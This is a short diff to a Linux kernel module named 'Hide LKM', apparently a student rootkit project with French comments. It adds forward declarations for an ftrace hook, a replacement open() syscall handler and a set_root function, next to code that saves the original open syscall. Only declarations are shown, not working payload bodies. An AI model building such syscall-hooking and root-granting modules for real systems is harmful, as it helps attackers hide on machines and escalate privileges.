@@ -15,6 +15,7 @@ MODULE_AUTHOR("victor, marouane, mina, axel");
 MODULE_DESCRIPTION("Hide LKM");
 MODULE_VERSION("0.01");
 
+
 // check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
@@ -24,6 +25,9 @@ MODULE_VERSION("0.01");
 #ifdef PTREGS_SYSCALL_STUBS
 // Pointeur vers la f° open pour save ses fonction d'origine
 static asmlinkage long (*orig_open)(const struct pt_regs *);
+struct ftrace_hook;
+asmlinkage int hook_open(const struct pt_regs *regs);
+void set_root(void);
 
 // f° hooké qui remplace le syscall open
 asmlinkage int hook_open(const struct pt_regs *regs)
